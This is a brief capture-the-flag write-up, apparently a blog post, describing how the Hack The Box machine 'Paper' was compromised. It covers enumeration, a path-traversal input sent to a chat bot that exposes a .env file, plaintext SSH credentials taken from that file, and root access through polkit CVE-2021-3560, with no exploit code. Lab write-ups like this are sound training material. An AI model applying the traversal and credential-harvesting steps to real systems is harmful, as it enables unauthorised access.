---
title: "HTB - Paper"
date: 2025-07-26
author: "ChaosSec"
tags: ["HTB", "WordPress", "Hubot", "Linux", "Privilege Escalation"]
summary: ""
---

## 🔍 Port Scanning

```bash
# Common ports discovered:
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
```

## 🌐 Web Enumeration

Running `nikto` revealed the virtual host:

```
office.paper
```

Browsing `http://office.paper` leads to a WordPress blog.

Accessing:

```
http://office.paper/?static=1
```

...displays a message containing a link to a **chat interface**.

## 🤖 Bot Interaction

Created a user account and messaged the bot `recyclops` in the general channel.

Used:

```
recyclops list../../../home/
```

This revealed a `.env` file located at:

```
/home/dwight/hubot/.env
```

## 🔐 Credential Extraction

Inside the `.env` file, found SSH credentials:

```text
User: dwight
Password: Queenofblad3s!23
```

Connected via SSH:

```bash
ssh dwight@10.10.11.143
```

## ⬆️ Privilege Escalation

Ran LinPEAS and discovered the machine is vulnerable to:

**CVE-2021-3560** — a well-known polkit privilege escalation vulnerability.

Exploited it to gain **root** access.

🎯 **Root access achieved.**
